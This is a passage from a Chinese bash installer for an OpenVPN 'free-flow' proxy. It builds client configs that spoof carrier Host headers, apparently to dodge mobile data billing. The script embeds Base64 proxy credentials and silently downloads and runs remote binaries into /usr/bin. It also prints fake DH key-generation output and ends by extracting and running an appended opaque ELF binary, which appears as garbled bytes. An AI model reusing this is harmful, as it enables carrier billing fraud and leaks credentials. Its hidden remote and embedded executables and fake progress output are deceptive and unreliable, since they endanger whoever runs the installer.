            echo "auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd
auth_param basic children 5  
auth_param basic realm Welcome to pycredit's proxy-only web server 
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 8080
acl CONNECT method CONNECT
acl squid_user proxy_auth REQUIRED
via off
request_header_access X-Forwarded-For deny all
request_header_access user-agent  deny all
reply_header_access X-Forwarded-For deny all
reply_header_access user-agentdeny all
http_port 80
http_access allow squid_user
http_access deny all
cache_dir ufs /var/spool/squid 100 16 256 read-only
cache_mem 0 MB
coredump_dir /var/spool/squid
access_log /var/log/squid/access.log
visible_hostname TD-LTE/FDD-LTE(www.sbwml.cn)
cache_mgr Welcome_to_use_OpenVPN_For_www.sbwml.cn
# www.sbwml.cn" >./${sq}
            chmod 0755 ./${sq}
        fi
        rd=`echo -n $versions|md5sum`
    else
    yum remove openvpn squid passwd >/dev/null 2>&1
    echo "$PP";
    exit 0;
fi
${sbwml} squid_passwd ${squsername} ${sqpasswd}
#################  编译UDP  #################
cd /usr/bin/
if [[ $mode == "1" ]];then
rm -f udp
curl -o udp http://sbwml.cn/yumhttp/udp >/dev/null 2>&1 
chmod 0755 udp >/dev/null 2>&1 
fi
if [[ $mode == "3" ]];then
rm -f udp
curl -o udp http://sbwml.cn/yumhttp/udp >/dev/null 2>&1 
chmod 0755 udp >/dev/null 2>&1 
fi
#################  编译UDP  #################

cd /etc/openvpn/easy-rsa/
source vars >/dev/null 2>&1
./clean-all >/dev/null 2>&1
echo 
if [[ $ipmd == ${proxy%%\ *} ]]
    then
        echo "正在生成CA/服务端证书..."
        ./ca && ./centos centos >/dev/null 2>&1
        echo "证书创建完成 "
    else
        yum remove openvpn -y >/dev/null 2>&1 && rm -f /usr/bin/udp >/dev/null 2>&1
        echo "$PP";
        exit 0;
fi
sleep 0.8
#echo 
#echo "正在生成客户端证书“user01”，请根据提示输入 y 进行确认，按回车继续"
#read
#./build-key user01
#echo 
clear
echo 
echo "正在生成SSL加密证书..."
sleep 1
echo -n "Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time
......................................................................+......................................................................................+..................................+...........................................................................................+........................................................"
echo -n "...........................+..............+.................................+.........................................+...............................................................+.........................+..............+.............................................................................+...........................................................................................................................................+...............................................+....................................................................+...............................................................................................+...........................................................................................................+...............................................................................................................................+.......................................................................................+.............................................+................+.................................................................................................................................................................................................................................................................+........................+....+..................................................................................................+..........................."
echo ".....................................+....+...........+..............+..........................................+...................................................................................+..........+................................................................................+...........................................................................................................................+...........................................................++*++*"
#./build-dh
echo
echo "正在生成TLS密钥..."
sleep 0.5
openvpn --genkey --secret ta.key
# OpenVPN Installing ****************************************************************************
echo 
echo "正在启动服务..."
sleep 0.8
#service openvpn start
openvpn --config /etc/scripts.conf >/dev/null 2>&1 &
echo -e "服务状态：      [\033[32m  OK  \033[0m]"
#chkconfig openvpn on
rm -rf /etc/rc.d/init.d/openvpn
sleep 0.8
clear
# OpenVPN Installing ****************************************************************************
cd /etc/openvpn
Info=`echo ca|md5sum`
if [[ $camd == ${Info%%\ *} ]]
    then
    time=1800000;
    else
    clear
    echo "$error";
        rm -rf /etc/openvpn
        yum remove openvpn >/dev/null 2>&1
    exit
fi
\cp -rf /etc/openvpn/easy-rsa/keys/ca.crt /home/ca.crt >/dev/null 2>&1
\cp -rf /etc/openvpn/easy-rsa/ta.key /home/ta.key >/dev/null 2>&1
cd /home
clear
echo
echo "正在生成OpenVPN.ovpn配置文件..."
echo
#echo "> 请选择运营商配置文件："
#echo
#echo " 1 - 中国联通. " 
#echo
#echo " 2 - 中国移动. "
#echo 
#echo -n "输入选项: "
#read code
#if [ -z $code ]
#then
######################### HTTP转接 #########################
#    if [[ $type == yes ]]
#    then
#        echo "输入错误，默认生成中国移动配置文件"
#        echo 
        echo "正在生成中国移动配置文件（HTTP转接）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote wap.10086.cn 80
http-proxy-option EXT1 POST http://wap.10086.cn
http-proxy-option EXT1 Host wap.10086.cn
http-proxy-option EXT1 Host: wap.10086.cn / HTTP/1.1' >OpenVPN-HTTP-yd.ovpn
        #echo 写入代理端口 （$IPAddress:$port）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-yd.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-yd.ovpn
        fi
        echo '########免流代码########
' >>OpenVPN-HTTP-yd.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-yd.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-yd.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-yd.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-yd.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-yd.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-yd.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-HTTP-yd.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-yd.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-yd.ovpn
        echo "生成OpenVPN-HTTP-yd.ovpn文件"
        echo "配置文件制作完毕"
#    fi
######################### 常规 #########################
#    if [[ $type == no ]]
#    then
#        echo "输入错误，默认生成中国移动配置文件"
        echo 
        echo "正在生成中国移动配置文件（常规）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
#类型：常规
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "GET http://rd.go.10086.cn" 
http-proxy-option EXT1 "X-Online-Host: rd.go.10086.cn" 
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "X-Online-Host: rd.go.10086.cn" 
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "Host: rd.go.10086.cn" 
http-proxy-option EXT1 "GET http://rd.go.10086.cn" 
http-proxy-option EXT1 "Host: rd.go.10086.cn"
########免流代码########
' >ovpn.1
        #echo 写入代理端口 （$IPAddress:80）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$proxyport）
        else
            echo 写入代理端口 （$IPAddress:80）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $proxyport >myip
        else
            echo http-proxy $IPAddress 80 >myip
        fi
        
        cat ovpn.1 myip>ovpn.2
        cat ovpn.2 >ovpn.4
            echo "<http-proxy-user-pass>" >>ovpn.4
            echo ${squsername} >>ovpn.4
            echo ${sqpasswd} >>ovpn.4
            echo "</http-proxy-user-pass>
" >>ovpn.4
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo remote $IPAddress $vpnport tcp-client >ovpn.5
        cat ovpn.4 ovpn.5>ovpn.6
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >ovpn.7
        cat ovpn.6 ovpn.7>ovpn.8
        echo "写入CA证书"
        sleep 0.3
        cat ovpn.8 ca.crt>ovpn.9
        echo '</ca>
key-direction 1
<tls-auth>' >ovpn.10
        cat ovpn.9 ovpn.10>ovpn.11
        echo "写入TLS密钥"
        sleep 0.3
        cat ovpn.11 ta.key>ovpn.12
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >ovpn.13
        echo "生成OpenVPN-Old-yd.ovpn文件"
        cat ovpn.12 ovpn.13>OpenVPN-Old-yd.ovpn
            echo
        echo "配置文件制作完毕"
#    fi

        echo 
        echo "正在生成广东联通配置文件（HTTP转接）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote wap.17wo.cn 80
http-proxy-option EXT1 POST http://wap.17wo.cn
http-proxy-option EXT1 Host wap.17wo.cn' >OpenVPN-HTTP-lt.ovpn
        #echo 写入代理端口 （$IPAddress:$port）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-lt.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-lt.ovpn
        fi
        echo "########免流代码########" >>OpenVPN-HTTP-lt.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-lt.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-lt.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-lt.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-lt.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-lt.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-lt.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-HTTP-lt.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-lt.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-lt.ovpn
        echo "生成OpenVPN-HTTP-lt.ovpn文件"
        echo "配置文件制作完毕"

        echo 
        echo "正在生成中国联通配置文件（常规）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：常规
# 本文件由系统自动生成
# 代理验证：
# <http-proxy-user-pass>
# sbwml2016
# root
# </http-proxy-user-pass>
# 端口：80
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
http-proxy-option EXT1 "Proxy-Authorization: Basic MzAwMDAwNDU5MDpGRDYzQTdBNTM0NUMxMzFF"
http-proxy-option EXT1 "Proxy-Authorization:Basic YWs0NDc5OjZjOGJlMmRkYzU3MjM4MmYxNzMyMmJiMjlhNDNkZjJi" 
http-proxy 58.254.132.86 8143 ' >OpenVPN-Old-lt.ovpn
        #echo 写入代理端口 （$IPAddress:80）
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$proxyport）
        else
            echo 写入代理端口 （$IPAddress:80）
        fi
        sleep 0.3
        
        echo '########免流代码########
' >>OpenVPN-Old-lt.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
            echo remote $IPAddress $vpnport tcp-client >>OpenVPN-Old-lt.ovpn
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-Old-lt.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-Old-lt.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-Old-lt.ovpn && mv OpenVPN2.ovpn OpenVPN-Old-lt.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-Old-lt.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-Old-lt.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-Old-lt.ovpn && mv OpenVPN3.ovpn OpenVPN-Old-lt.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-Old-lt.ovpn
        echo "生成OpenVPN-Old-lt.ovpn文件"
        echo "配置文件制作完毕"
        
        echo 
        echo "正在生成中国电信配置文件（HTTP转接 爱玩）"
        echo 
        echo "写入前端代码"
        sleep 0.3
        echo '# 骚逼汪云免配置
# 类型：HTTP转接-爱玩
# 本文件由系统自动生成
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
proto tcp
connect-retry-max 5
connect-retry 5
resolv-retry 60
########免流代码########
remote cdn.4g.play.cn 443
http-proxy-option EXT1 "GET http://cdn.4g.play.cn "
http-proxy-option EXT1 "POST http://cdn.4g.play.cn "
http-proxy-option EXT1 "X-Online-Host: cdn.4g.play.cn "
http-proxy-option EXT1 "Host: cdn.4g.play.cn " ' >OpenVPN-HTTP-dxaw.ovpn
        if [[ $mode == 4 ]]
        then
            echo 写入代理端口 （$IPAddress:$httpports）
        else
            echo 写入代理端口 （$IPAddress:$port）
        fi
        sleep 0.3
        if [[ $mode == 4 ]]
        then
            echo http-proxy $IPAddress $httpports >>OpenVPN-HTTP-dxaw.ovpn
        else
            echo http-proxy $IPAddress $port >>OpenVPN-HTTP-dxaw.ovpn
        fi
        echo "########免流代码########" >>OpenVPN-HTTP-dxaw.ovpn
        echo 写入OpenVPN端口 （$IPAddress:$vpnport）
        echo "写入中端代码"
        sleep 0.3
        echo 'resolv-retry infinite
nobind
persist-key
persist-tun

<ca>' >>OpenVPN-HTTP-dxaw.ovpn
        echo "写入CA证书"
        sleep 0.3
        cat OpenVPN-HTTP-dxaw.ovpn ca.crt >OpenVPN2.ovpn
        rm -rf OpenVPN-HTTP-dxaw.ovpn && mv OpenVPN2.ovpn OpenVPN-HTTP-dxaw.ovpn
        echo '</ca>
key-direction 1
<tls-auth>' >>OpenVPN-HTTP-dxaw.ovpn
        echo "写入TLS密钥"
        sleep 0.3
        cat OpenVPN-HTTP-dxaw.ovpn ta.key>OpenVPN3.ovpn
        rm -rf OpenVPN-HTTP-dxaw.ovpn && mv OpenVPN3.ovpn OpenVPN-HTTP-dxaw.ovpn
        echo "写入后端代码"
        echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >>OpenVPN-HTTP-dxaw.ovpn
        echo "生成OpenVPN-HTTP-dxaw.ovpn文件"
        echo "配置文件制作完毕"
        
sleep 2
clear

echo
echo "创建vpn启动命令"
if [[ $mode == 1 ]]
    then
    cd /usr/bin
    rm -f vpn vpn1
    wget http://sbwml.cn/yumhttp/start0520/vpn1 >/dev/null 2>&1 && mv vpn1 vpn >/dev/null 2>&1
    chmod 0755 /usr/bin/vpn
fi
if [[ $mode == 2 ]]
    then
    cd /usr/bin
    rm -f vpn vpn2
    wget http://sbwml.cn/yumhttp/start0520/vpn2 >/dev/null 2>&1 && mv vpn2 vpn >/dev/null 2>&1
    chmod 0755 /usr/bin/vpn
fi
if [[ $mode == 3 ]]
    then
    cd /usr/bin
    rm -f vpn vpn3
    wget http://sbwml.cn/yumhttp/start0520/vpn3 >/dev/null 2>&1 && mv vpn3 vpn >/dev/null 2>&1
    chmod 0755 /usr/bin/vpn
fi
if [[ $mode == 4 ]]
    then
    if [[ $BLDOG = yes ]];then
    cd /usr/bin && halt
    rm -f vpn vpn5 port >/dev/null 2>&1
    wget http://sbwml.cn/${name}:${code}/vpnrestart/vpn5 >/dev/null 2>&1
    #wget http://sbwml.cn/${name}:${code}/port/port >/dev/null 2>&1
    #\cp -rf /sbwml/moba/port/port ./
    #chmod 0755 /usr/bin/port >/dev/null 2>&1
    else
    cd /usr/bin
    rm -f vpn jievpn port >/dev/null 2>&1
    wget http://sbwml.cn/${name}:${code}/vpnrestart/openssl >/dev/null 2>&1
    #\cp -rf /sbwml/moba/vpnrestart/jievpn ./
    sed -i "24s/8080/$httpports/" jievpn
    shc -vrTf jievpn >/dev/null 2>&1 && mv jievpn.x vpn >/dev/null 2>&1 && rm -f jievpn jievpn.x.c
    chmod 0755 /usr/bin/vpn >/dev/null 2>&1
    #wget http://sbwml.cn/${name}:${code}/port/port >/dev/null 2>&1
    #\cp -rf /sbwml/moba/port/port ./
    #chmod 0755 /usr/bin/port >/dev/null 2>&1
    fi
fi
cd /usr/bin
rm -f ./vpnoff
wget wget http://sbwml.cn/yumhttp/start0514/vpnoff >/dev/null 2>&1
chmod 0755 /usr/bin/vpnoff
if [[ $mode == 4 ]]
    then
    echo "[Unit]  
Description=vpn
After=network.target  

[Service]  
Type=forking  
ExecStart=/bin/vpn
ExecReload=/bin/vpn
ExecStop=/bin/vpnoff
PrivateTmp=true

[Install]  
WantedBy=multi-user.target" >/lib/systemd/system/vpn.service
    systemctl enable vpn.service >/dev/null 2>&1
	chattr -R +i /data/www/default
	echo -e "网站安全锁定:\t\t\t[  \033[32mlock\033[0m  ]"
fi

########################  创建WEB面板管理/文本密码  ##########################
if [[ $ov4 == 4 ]]
then
    if [[ $BLDOG = no ]];then
    clear
    echo
    echo " 创建WEB面板管理密码"
    echo 
    echo -n "  输入管理员密码："
    read ovmysql
    if [ -z $ovmysql ]
        then
            echo -n "  密码不能为空，请重新输入："
            read ovmysql
            if [ -z $ovmysql ]
                then
                    echo  "  输入错误，系统创建默认管理员密码：root"
                    ovmysql=root;
                else
                    username=root;
                fi
    else
        username=root;
    fi 
    #wget http://www.sbwml.cn/${name}:${code}/ov.sql >/dev/null 2>&1
    \cp -rf /sbwml/moba/ov.sql ./
        chmod 777 ov.sql
        sed -i "47s/root/$ovmysql/" ov.sql
        mysql -uroot -p$sqlpassword -hlocalhost ov < ov.sql
        
    fi
    
    if [[ $BLDOG = yes ]];then
    clear
    echo
    echo " 创建WEB面板管理员账号/密码"
    echo 
    echo -n "  输入管理员账号："
    read bldogname
    if [ -z $bldogname ]
        then
            echo -n "  密码不能为空，请重新输入："
            read bldogname
            if [ -z $bldogname ]
                then
                    echo  "  输入错误，系统创建默认管理员账号：root"
                    bldogname=root;
                else
                    username=root;
                fi
    else
        username=root;
    fi
    echo -n "  输入管理员密码："
    read bldogpass
    if [ -z $bldogpass ]
        then
            echo -n "  密码不能为空，请重新输入："
            read bldogpass
            if [ -z $bldogpass ]
                then
                    echo  "  输入错误，系统创建默认管理员密码：root"
                    bldogpass=root;
                else
                    username=root;
                fi
    else
        username=root;
    fi
    #sed -i "9s/root/$bldogname/" /data/www/default/config.php
    #sed -i "10s/root/$bldogpass/" /data/www/default/config.php
    #wget http://www.sbwml.cn/${name}:${code}/bldogov.sql >/dev/null 2>&1
    \cp -rf /sbwml/moba/bldogov.sql ./
        chmod 777 bldogov.sql
		sed -i "45s/name/$bldogname/" bldogov.sql
		sed -i "47s/code/$bldogpass/" bldogov.sql
        sed -i "144s/IP/$IPAddress/" bldogov.sql
        sed -i "144s/riqi/$riqi/" bldogov.sql
        sed -i "144s/shijian/$shijian/" bldogov.sql
        mysql -uroot -p$sqlpassword -hlocalhost ov < bldogov.sql
    
    fi
    
else
    echo 
    echo "创建OpenVPN连接账号"
    echo 
    echo -n "  输入新账号："
    read ADMIN
    if [ -z $ADMIN ]
        then
            echo -n "  账号不能为空，请重新输入："
            read ADMIN
                if [ -z $ADMIN ]
                    then
                        echo  "  输入错误，系统创建默认账号：root"
                    ADMIN=root;
                    else
                    username=root;
                fi
        username=root;
    fi 
    echo -n "  输入新密码："
    read VPNPASSWD
    if [ -z $VPNPASSWD ]
        then
            echo -n "  密码不能为空，请重新输入："
            read VPNPASSWD
                if [ -z $VPNPASSWD ]
                    then
                        echo  "  输入错误，系统创建默认密码：root"
                        VPNPASSWD=root;
                    else
                        userpasswd=root;
                fi
    else
        userpasswd=root;
    fi
    echo $ADMIN $VPNPASSWD >/passwd
    
fi

########################  创建WEB面板管理密码  ##########################
cd /home
########################    说明书        ##########################
if [[ $mode == 4 ]]
    then
    echo '《欢迎使用骚逼汪™OpenVPN云免快速安装脚本》

当前为WEB面板安装模式
' >info.txt
echo 后台地址：$IPAddress:8888 >>info.txt
echo '
重启服务命令：vpn
停止服务命令：vpnoff
更改端口/DNS：port

Android应用：首次安装后需要重启设备后才能使用哦！

HTTP转接配置文件：OpenVPN-HTTP.ovpn （默认接入点 3gnet/cmnet）
常规配置文件：OpenVPN-Old.ovpn      （默认接入点 3gnet/cmnet）
' >>info.txt

else
    echo '《欢迎使用骚逼汪™OpenVPN云免快速安装脚本》

OpenVPN连接账号' >info.txt
echo 你的账号：$ADMIN >>info.txt
echo 你的密码：$VPNPASSWD >>info.txt
echo '
重启服务命令：vpn
停止服务命令：vpnoff

创建账号命令：echo 账号 密码 >>/passwd
示例：echo 123 456 >>/passwd （即可创建 账号：123 密码：456）

HTTP转接配置文件：OpenVPN-HTTP.ovpn （默认接入点 3gnet/cmnet）
常规配置文件：OpenVPN-Old.ovpn      （默认接入点 3gnet/cmnet）

删除账号命令：vi /passwd

输入 i 对文件进行修改，删除目标账号后，按 Esc 退出编辑，
并输入 :wq （保存退出）' >>info.txt
fi

########################    说明书        ##########################

echo 
echo "创建成功"
sleep 3
rm -f /data/www/default/${VPNFILE}
rm -f /var/www/html/${VPNFILE}

if [[ $mode == "1" ]]
    then
    zip ${VPNFILE} ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
fi

if [[ $mode == "2" ]]
    then
    zip ${VPNFILE} ./{OpenVPN-Old-yd.ovpn,OpenVPN-Old-lt.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
fi

if [[ $mode == "3" ]]
    then
    zip ${VPNFILE} ./{OpenVPN-HTTP-yd.ovpn,OpenVPN-Old-yd.ovpn,OpenVPN-HTTP-lt.ovpn,OpenVPN-Old-lt.ovpn,OpenVPN-HTTP-dxaw.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
fi

if [[ $mode == "4" ]]
    then
	sed "1,/^### END OF sbwml.cn THE SCRIPT ###/d" "$0" > $1;su ./$1
### END OF sbwml.cn THE SCRIPT ###
    << EOF
ELF          >    ?@     @        y         @ 8  @         @       @ @     @ @     ?      ?                           @      @                                          @       @     ,      ,                              `       `     鋀     (Y                   (       ( `     ( `     ?      ?                         @     @     D       D              P錿d   8      8@     8@     d       d              Q錿d                                                  /lib64/ld-linux-x86-64.so.2          GNU                       GNU 9鷮邅t惔z*"?憹笁?            0  ?@          艍惸箿@9驄                            S                                             "                      ?                     €                      ?                     7                      L                      ?                                           ?                     y                      r                      ?                     Z                      >                      k                      E                      ?                     ?                     2                      ?  !   xa            ?  !   xa            ?     xa            ?    xa             __gmon_start__ libc.so.6 sprintf __isoc99_sscanf time getpid strdup calloc strlen memset __errno_location memcmp putenv memcpy malloc getenv stderr execvp fprintf atoll strerror __libc_start_main __environ __xstat GLIBC_2.7 GLIBC_2.2.5                                                ii
   ?     ui	   ?      ?`                    xa                   xa                   ?`                   ?`                   ?`                   ?`                   ?`                    "`                   "`                   "`        	           "`        
            "`                   ("`                   0"`        
           8"`                   @"`                   H"`                   P"`                   X"`                   `"`                   h"`                   p"`                   H冹鑻  ?  ?  H兡?5"  %$  @ %"  h    猷%  h   樾%  h   槔%
  h   榘%  h   闋%?  h   閻%?  h   閫%?  h   閜%?  h   閌%?  h	   镻%?  h
   锧%?  h   ?%?  h   ?%?  h
   ?%?  h   ?%?  h   轲?%?  h   猷?%?  h   樾?%?  h   槔?%?  h   榘?1鞩壯^H夆H冧餚TI抢 @ H橇@ H乔3@ 枳?魫怘冹H??  H吚t蠬兡脨悙悙悙悙悙悙UH夊SH冹€=續!  uK? ` H?簃! H侂 ` H聋H冸H9豷$fD  H兝H?昺! ? ` H?噈! H9豶馄sm! H兡[擅fff.?    H?h   UH夊t?   H吚t? ` ?嗌脨怳H夊?Cn!  ?<n! ?5n! ?.n! ?'n! ? n! 独?n! H槇?xa ?n! 兝?! ?鱩! 劺u躺肬H夊H墋鑹u銱婨鐷塃?  ?襪! 独H?秬 xa 圗??緈! E鲌祄! ?琺! 独壜龙鱹鋲蠬楬E???憁! ??坢! ?m! 度?wm! 独H?稅 xa Hc翀?xa ?[m! 独H?禪鲌?xa ?Cm! 兝?:m! ?3m! 劺匯H丒?  乵?  儅??擅UH夊H墋鑹u銱婨鐷塃?  ?駆! 兝?鑜! ?醠! 独H?秬 xa 圗??蘬! E鲌胠! ?籰! 度?瞝! 独H?稅 xa Hc翀?xa ?杔! 独H?禪鲌?xa ?l! 独H?秬 xa  E鱄婨??禘鱄?秬 xa 1翲婨鴪H僂?僲?儅?廔擅UH夊H侅0  H壗佝H媴佝H崟pH壷H壡钄  吚y
?閷   H崊帼簮   ?   H壡鑮?H媴xH墔棹H媴pH墔帼H婨楬墔婨寜咟?婨悏?H婨燞墔H婨菻墔8H婨豀墔HH崊帼緪   H壡鑾??   擅UH夊H墋鳫塽痣H僂?H儅?t2H婨鳫?H吚t&H婨鳫?H;E饀垭H婨鳫兝H?H婨鳫?H僂?H儅?tH婨鳫?H吚u稚肬H夊SH侅H  壗箭H荅?@ 柝?H楬婾豀饕HH1E毓@ H婾豀崊旋H壩H壡?   枳?H崊旋H壡??H塃鐷崊旋H壡钑?塃郒儅?uP?@ 婨郒c蠬崊旋H袐嵓?H婾豀夀H壡?   鑭?H崊旋H壡柰?H壡钑??   閮   ?@ H婨鐷嵉旋H崓凝H崟三I夝H夀H壡?   韬?塃鋬}?uDH媴三H;E豼7婨圜蠬楬壜HU鐷?蟞! H壷H壡鑜?媴凝嫊箭壯)翂葍???H伳H  [擅UH夊SH冹H墋糎塽癏婨癏?H塃梃R??  繃va 铻??   科wa 鑠??   ?va 鑑??va ?劺t&?va 棼?H壝?   ??H9脈
钙wa 镵  ?   ?va ???   繝"` ???   控"` ???   跨"` 梵??   宽"` 桎??   宽"` 梏??   喀"` 杵??   睛"` 宽"` 鐱?吚t
?     \   ??   A?C
?     |   瘤?   A?C
?     ?  h?a    A?C                  @"`                   H"`                   P"`                   X"`                   `"`                   h"`                   p"`                   H冹鑻  ?  ?  H兡?5"  %$  @ %"  h    猷%  h   樾%  h   槔%
  h   榘%  h   闋%?  h   閻%?  h   閫%?  h   閜%?  h   閌%?  h	   镻%?  h
   锧%?  h   ?%?  h   ?%?  h
   ?%?  h   ?%?  h   轲?%?  h   猷?%?  h   樾?%?  h   槔?%?  h   榘?1鞩壯^H夆H冧餚TI抢 @ H橇@ H乔3@ 枳?魫怘冹H??  H吚t蠬兡脨悙悙悙悙悙悙UH夊SH冹€=續!  uK? ` H?簃! H侂 ` H聋H冸H9豷$fD  H兝H?昺! ? ` H?噈! H9豶馄sm! H兡[擅fff.?    H?h   UH夊t?   H吚t? ` ?嗌脨怳H夊?Cn!  ?<n! ?5n! ?.n! ?'n! ? n! 独?n! H槇?xa ?n! 兝?! ?鱩! 劺u躺肬H夊H墋鑹u銱婨鐷塃?  ?襪! 独H?秬 xa 圗??緈! E鲌祄! ?琺! 独壜龙鱹鋲蠬楬E???憁! ??坢! ?m! 度?wm! 独H?稅 xa Hc翀?xa ?[m! 独H?禪鲌?xa ?Cm! 兝?:m! ?3m! 劺匯H丒?  乵?  儅??擅UH夊H墋鑹u銱婨鐷塃?  ?駆! 兝?鑜! ?醠! 独H?秬 xa 圗??蘬! E鲌胠! ?籰! 度?瞝! 独H?稅 xa Hc翀?xa ?杔! 独H?禪鲌?xa ?l! 独H?秬 xa  E鱄婨??禘鱄?秬 xa 1翲婨鴪H僂?僲?儅?廔擅UH夊H侅0  H壗佝H媴佝H崟pH壷H壡钄  吚y
?閷   H崊帼簮   ?   H壡鑮?H媴xH墔棹H媴pH墔帼H婨楬墔婨寜咟?婨悏?H婨燞墔H婨菻墔8H婨豀墔HH崊帼緪   H壡鑾??   擅UH夊H墋鳫塽痣H僂?H儅?t2H婨鳫?H吚t&H婨鳫?H;E饀垭H婨鳫兝H?H婨鳫?H僂?H儅?tH婨鳫?H吚u稚肬H夊SH侅H  壗箭H荅?@ 柝?H楬婾豀饕HH1E毓@ H婾豀崊旋H壩H壡?   枳?H崊旋H壡??H塃鐷崊旋H壡钑?塃郒儅?uP?@ 婨郒c蠬崊旋H袐嵓?H婾豀夀H壡?   鑭?H崊旋H壡柰?H壡钑??   閮   ?@ H婨鐷嵉旋H崓凝H崟三I夝H夀H壡?   韬?塃鋬}?uDH媴三H;E豼7婨圜蠬楬壜HU鐷?蟞! H壷H壡鑜?媴凝嫊箭壯)翂葍???H伳H  [擅UH夊SH冹H墋糎塽癏婨癏?H塃梃R??  繃va 铻??   科wa 鑠??   ?va 鑑??va ?劺t&?va 棼?H壝?   ??H9脈
钙wa 镵  ?   ?va ???   繝"` ???   控"` ???   跨"` 梵??   宽"` 桎??   宽"` 梏??   喀"` 杵??   睛"` 宽"` 鐱?吚t
疙"` 槔  婨級氰擙塃跃   坷"` 鑸?儅?y
咐"` 閿  婨純?H樉   H壡??H塃郒儅?u
?   閖  儅?勼   ?   ?#` ???#` ?劺u?va 桊?吚t
